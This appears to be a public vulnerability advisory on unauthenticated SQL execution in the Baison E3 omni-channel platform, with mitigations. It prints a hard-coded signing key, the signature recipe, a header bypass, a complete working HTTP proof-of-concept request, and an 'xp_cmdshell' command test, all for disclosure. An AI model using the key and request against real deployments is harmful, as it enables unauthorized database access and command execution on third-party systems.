# Baison E3 全渠道中台 — `ExecByControlName_Two` Unauthenticated Arbitrary SQL Execution (leading to Remote Code Execution)

> **VulDB-style advisory.** This document is the public reference attached to the
> CVE / VulDB submission for this issue. Format follows the VulDB entry layout
> (entry metadata → description → affected products → timeline → references → credits).
>
> 本文件为按 VulDB 条目格式整理的公开漏洞通报，用于 CVE / VulDB 报送时作为公开引用。

---

## Entry Metadata

| Field | Value |
|---|---|
| **VulDB Entry** | *pending* (submitted 2026-11-03) |
| **CVE ID** | *pending* |
| **CWE** | `CWE-89` Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')<br>`CWE-306` Missing Authentication for Critical Function<br>`CWE-798` Use of Hard-coded Credentials |
| **Classification** | SQL Injection — critical |
| **CVSS v3.1** | `9.8` Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Attack Type** | Remote |
| **Impact** | SQL Execution → potential OS Command Execution |
| **Authentication Required** | **No** |
| **Vendor** | Baison Software (上海百胜软件股份有限公司) |
| **Product** | Baison E3 全渠道中台 (E3 Omni-channel Retail Platform) |
| **Affected Version** | `V2.x` — reported affected range `V2.3.0-T5` … `V2.5.1-T6` (boundaries not independently verified); confirmed on a build with `buildTime 20260929`, `productCode 1008` |
| **Vulnerable Component** | `POST /e3api/api/KHATTACH/ExecByControlName_Two` |
| **Disclosure Date** | 2026-11-03 |
| **Reporter** | SDshadow |

---

## Description

A vulnerability classified as **critical** has been found in Baison E3 全渠道中台
(E3 Omni-channel Retail Platform). Affected by this issue is the
`ExecByControlName_Two` endpoint of the `KHATTACH` controller. The endpoint
reflectively invokes an arbitrary backend method named by the client-supplied
`controleName` / `method` fields **without any authentication**, and passes
`retObjs[0]` — an arbitrary attacker-controlled string — directly to the
backend SQL Server as a T-SQL batch. The same endpoint accepts `EXEC`
statements, so on deployments where the database connection runs as `sa` and
`xp_cmdshell` is enabled (both confirmed on a verified deployment), the issue
yields unauthenticated remote code execution on the database host.

Three independent protection layers fail:

1. **The request signature is not authentication (CWE-798, CWE-306).**
   `Sign = md5(timestamp + "AccessTokenUserIDwcfService" + dataJson + SIGN_KEY)`,
   where `SIGN_KEY = 5feb28f6a28613ace02fe261c6b6c294` is hard-coded in the
   product's public frontend JavaScript bundle and shared across deployments.
   `AccessToken` and `UserID` are accepted when empty, so any offline party can
   produce a valid signature.

2. **The AES request-body gateway is bypassed by omission.** Requests carrying
   an `En-Status` header are decrypted by the gateway; requests **without** the
   header are passed through as plaintext multipart without any access control.

3. **The reflection dispatcher has no method whitelist.** The generic SQL
   helper `mod_ComFunc.GetDataBySql_Two` (and `GetDataBySql`) is reachable from
   the public dispatcher. The database connection runs as `sa` (`SYSTEM_USER`
   confirmed; `is_srvrolemember('sysadmin') = 1` on the verified environment).

An additional unauthenticated SQL-injection endpoint
(`POST /e3api/api/main/getCacheDataFromDB`, parameters `selectFields` /
`tableName` / `where` string-concatenated into a query) and an unauthenticated
configuration-disclosure endpoint (`POST /e3api/api/SysInfo/SysParamInfo`,
returning the full system parameter table including platform credentials such
as `IAM_SECRET` / `PLAT_APPKEY` / `PLAT_SECRET`) exist in the same product.

### 中文摘要

百胜软件 E3 全渠道中台的 `KHATTACH/ExecByControlName_Two` 接口存在未认证任意 SQL
执行漏洞。该接口按客户端提交的 `controleName` + `method` 反射调用后端方法且无任何鉴权，
`retObjs[0]` 被原样交给 SQL Server 作为 T-SQL 批处理执行，且接受 `EXEC` 语句。
签名算法 `md5(timestamp + "AccessTokenUserIDwcfService" + dataJson + SIGN_KEY)`
所用的密钥 `5feb28f6a28613ace02fe261c6b6c294` 硬编码于公开前端 JS 并跨部署复用，
`AccessToken`/`UserID` 置空即可通过校验；请求不带 `En-Status` 头可绕过 AES 请求体
加密网关。数据库连接身份为 `sa`（已验证 `sysadmin=1`），部分部署启用 `xp_cmdshell`，
可达未认证远程代码执行。同一产品还存在 `getCacheDataFromDB` SQL 注入与
`SysParamInfo` 匿名全量参数泄露（含 `IAM_SECRET` 等平台凭据）问题。

---

## Affected Product

| Vendor | Product | Version | Status |
|---|---|---|---|
| Baison Software | E3 全渠道中台 | buildTime `20260929`, productCode `1008` | confirmed vulnerable |
| Baison Software | E3 全渠道中台 | productCode `1011` deployment | confirmed vulnerable |
| Baison Software | E3 全渠道中台 | reported range `V2.3.0-T5` … `V2.5.1-T6` | reported by assessment, boundaries **not independently verified** |

- Vendor product page: <https://www.baison.com.cn/>
- The signature key above was accepted unchanged on **three independently
  deployed instances** (one vendor demo deployment and two live customer
  deployments, domains withheld), indicating the defect is product-level
  rather than deployment-specific.

---

## Proof of Concept

No credentials, cookies or tokens of any kind are used. The three statements
below are the complete verification set; they are read-only.

### 1. Anonymous probe — `retObjs[0]` is executed by SQL Server

```http
POST /e3api/api/KHATTACH/ExecByControlName_Two HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="AccessToken"

------X
Content-Disposition: form-data; name="UserID"

------X
Content-Disposition: form-data; name="wcfService"

------X
Content-Disposition: form-data; name="timestamp"

1730000000000
------X
Content-Disposition: form-data; name="data"

{"controleName":"mod_ComFunc","method":"GetDataBySql_Two","retObjs":["select 1 as e3probe"]}
------X
Content-Disposition: form-data; name="Sign"

<md5("1730000000000AccessTokenUserIDwcfService" + dataJson + SIGN_KEY)>
------X--
```

Response (verbatim, host withheld):

```json
{"status":"success","message":"","data":"{\"A\":[{\"e3probe\":{\"Int32\":1},\"ROWSTATE\":{\"String\":\"2\"}}]}","code":null,"text":null}
```

`e3probe = 1` — the statement was executed by the database and echoed back,
with no session established.

### 2. Database identity

```sql
SELECT @@VERSION
-- → Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) … on Windows Server 2019 Datacenter

SELECT SYSTEM_USER
-- → sa
```

### 3. Command-execution path (configuration only, not exercised)

On one verified live deployment, `SELECT COUNT(*) FROM sys.configurations
WHERE name = 'xp_cmdshell' AND value_in_use = 1` returns `1` (enabled), and the
dispatcher accepts `EXEC` batches (`EXEC xp_cmdshell 'whoami'` returns
`status: success`; the result set is empty because `xp_cmdshell`'s second
column is unnamed and the E3 serialiser maps result columns by name). Combined
with `sa`, the remote-code-execution path is confirmed by configuration state;
this advisory does **not** include or demonstrate command execution payloads.

Ready-to-run script: [`poc/exploit.py`](poc/exploit.py) (Python 3 standard
library only; refuses statements containing write/command keywords).

---

## Evidence

Reproduction excerpts with hostnames redacted. Raw response text; screenshots
may be added later.

| # | File | Shows |
|---|---|---|
| 1 | [`evidence/e1-anonymous-sql-probe.redacted.txt`](evidence/e1-anonymous-sql-probe.redacted.txt) | `select 1 as e3probe` executed anonymously on two independent deployments (`productCode 1008`) |
| 2 | [`evidence/e2-db-identity.redacted.txt`](evidence/e2-db-identity.redacted.txt) | `SELECT @@VERSION` / `SELECT SYSTEM_USER` → `sa`, `sysadmin = 1` (authorized demo deployment) |
| 3 | [`evidence/e3-xpcmdshell-config.redacted.txt`](evidence/e3-xpcmdshell-config.redacted.txt) | `xp_cmdshell` `value_in_use = 1` and `EXEC` batch accepted (`ROWSTATE: empty`) on a live deployment |
| 4 | [`evidence/e4-sysparam-disclosure.redacted.txt`](evidence/e4-sysparam-disclosure.redacted.txt) | `SysParamInfo` anonymously returning the full system parameter table |

---

## Timeline

| Date | Event |
|---|---|
| 2026-10/11 | Vulnerability identified during an authorized assessment of a demo deployment, and reproduced on two independent live deployments |
| 2026-11-03 | Advisory published publicly (this document) |
| — | Vendor notification: *pending* |
| — | CVE ID requested / VulDB entry submitted |
| — | Public disclosure of the assigned CVE ID |

---

## Mitigation

No official patch is confirmed as of 2026-11-03. Recommended interim controls:

1. **Remove the generic SQL executor from the public dispatcher** —
   `mod_ComFunc.GetDataBySql(_Two)` must never be reachable from
   `ExecByControlName_Two`; enforce a strict whitelist of callable
   `controleName`/`method` pairs.
2. **Require real authentication** on `/e3api/api/KHATTACH/*` (and on
   `getCacheDataFromDB`, `SysParamInfo`): validate a server-issued session,
   not a client-computable signature.
3. **Replace the hard-coded signature key** and stop treating the signature as
   an access-control mechanism; if integrity signing is kept, derive per-deployment
   keys and bind them to an authenticated session.
4. **Close the `En-Status` bypass** — unknown or absent envelope headers must
   not skip request-body decryption.
5. **Least privilege for the database connection** — run the application under
   a dedicated low-privilege account instead of `sa`; disable `xp_cmdshell`,
   `OLE Automation Procedures` and `Ad Hoc Distributed Queries`.
6. **Parameterise** the `getCacheDataFromDB` query builder.

---

## References

| Type | Link |
|---|---|
| Advisory (this document) | `https://github.com/SDshadow/Baison-E3-unauth-SQLi/blob/main/README.md` |
| Vendor product page | <https://www.baison.com.cn/> |
| Related, earlier product-line issue | CNVD-2017-35839 — E3 V1.x front-end SQL injection attributed to a weak signature algorithm and insufficient input filtering (same root-cause pattern, different trigger point and version line) |
| Related, same product line | CNVD-2020-75300 — E3 configuration centre unauthorized access; CNVD-2026-11482 — E3 information disclosure |

> The 2017 issue was attributed to "a weak signature algorithm and insufficient
> filtering of user input". The present report concerns the V2.x
> `ExecByControlName_Two` reflection dispatcher; whether it constitutes a
> regression of the same defect or a separate vulnerability is for the vendor
> and the reviewing authority to determine. This is stated here proactively to
> avoid duplicate-disclosure ambiguity.

---

## Credits

- **Reporter:** SDshadow
- Verification: authorized demo deployment + two independently observed live
  deployments (hostnames withheld pending vendor coordination)

---

## Submission Checklist

Internal checklist for the CVE (MITRE) / VulDB submission — not part of the advisory body.

- [ ] **Vendor notification** — contact Baison Software (baison@baisonmail.com / 021-50184188) before wide disclosure; record the date here once contacted
- [x] Duplicate check — no prior CVE for the V2.x `ExecByControlName_Two` dispatcher (CNVD-2017-35839 covers V1.x; see References note)
- [x] Public reference published (this document)
- [ ] CVE ID requested via MITRE form *or* VulDB entry — choose **one** channel
- [ ] Reference the assigned CVE ID back into this document after publication
- [ ] Un-redact or further redact instance details according to vendor coordination status

---

## Disclaimer

This advisory is published for defensive and identification purposes. The proof
of concept is non-weaponised: it issues only read-only statements and refuses
write or command-execution statements by design. Do not use it against systems
you do not own or are not explicitly authorized to test.
